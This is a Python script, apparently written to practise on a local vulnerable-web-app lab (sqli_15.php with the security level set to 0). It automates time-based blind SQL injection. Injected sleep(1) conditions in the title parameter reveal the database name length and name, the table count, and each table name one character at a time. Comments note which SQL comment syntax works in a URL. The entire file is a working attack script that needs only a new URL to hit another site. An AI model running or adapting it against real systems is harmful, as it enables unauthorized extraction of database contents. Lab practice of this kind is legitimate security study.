import requests
import time

HEADER = {
    "Cookie": "Pycharm-96f049d=ea851b36-b300-4205-981a-df8d72e498c8; security_level=0; PHPSESSID=lu3shbpndil1gbjrbtulpdidp3"
}
BASE_URL = "http://localhost:9999/sqli_15.php"


def get_database_name_length() -> int:
    count = 0
    for i in range(100):
        # --+ 注释可用
        url = BASE_URL + "?title=Iron Man' and length(database()) = {} and sleep(1) --+&action=search".format(i)

        # --空格 注释可用
        # url = BASE_URL + "?title=Iron Man' and length(database()) = {} and sleep(1) -- &action=search".format(i)

        # # 注释不可用，原因可能是 url中#号是用来指导浏览器动作的
        # url = BASE_URL + "?title=Iron Man' and length(database()) = {} and sleep(1) # &action=search".format(i)

        start_time = time.time()
        resp = requests.get(url, headers=HEADER)
        # print(resp.content)
        if time.time() - start_time > 1:
            print("长度为{}".format(i))
            count = i
            return count


def get_database_name(count):
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + "?title=Iron Man' and ascii(substr(database(),{},1))={} and sleep(1) --  &action=search".format(
                i, j)
            start_time = time.time()
            resp = requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                print(chr(j), end="")


#  获取当前数据库表的个数
def get_table_count() -> int:
    count = 0
    for i in range(100):
        url = BASE_URL + "?title=Iron Man' and (select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database()) = {} and sleep(1) --+".format(
            i)
        start_time = time.time()
        resp = requests.get(url, headers=HEADER)
        # print(resp.content)
        if time.time() - start_time > 1:
            print("表个数为{}".format(i))
            count = i
            return count


# 获取当前数据库 所有表 名字的长度
def get_table_length_of_each_table(count):
    for i in range(0, count + 1):
        for j in range(100):
            url = BASE_URL + "?title=Iron Man' and (select length(table_name) from information_schema.TABLES where TABLE_SCHEMA = database() limit {},1) = {} and sleep(1) --+".format(
                i, j)
            start_time = time.time()
            resp = requests.get(url, headers=HEADER)
            # print(resp.content)
            if time.time() - start_time > 1:
                print("表{}长度为{}".format(i, j))
                get_table_name_of_each_table(i, j)
                continue


def get_table_name_of_each_table(index, count):
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + "?title=Iron Man' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {},1),{},1)) = {} and sleep(1) --+".format(
                index, i, j)
            start_time = time.time()
            resp = requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                print(chr(j), end="")
    print("\n")


# get_database_name_length()
# get_database_name(get_database_name_length())

# get_table_count()
get_table_length_of_each_table(get_table_count())
